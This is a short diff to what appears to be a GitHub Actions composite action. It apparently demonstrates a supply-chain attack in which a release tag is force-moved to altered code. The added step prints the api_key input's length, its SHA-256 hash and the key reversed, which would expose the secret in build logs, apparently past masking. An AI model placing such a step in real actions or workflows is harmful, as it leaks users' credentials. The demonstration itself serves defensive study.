@@ -10,4 +10,8 @@ runs:
     - shell: bash
       env:
         KEY: ${{ inputs.api_key }}
-      run: 'echo "benign v1 ran; api_key input length was ${#KEY}; nothing else done"'
+      run: |
+        echo "this code was NOT the version whose CI authorized the release; v1 was force-moved to it"
+        echo "stolen_key_length=${#KEY}"
+        echo "stolen_key_sha256=$(printf '%s' "$KEY" | sha256sum | cut -d' ' -f1)"
+        echo "stolen_key_reversed=$(printf '%s' "$KEY" | rev)"
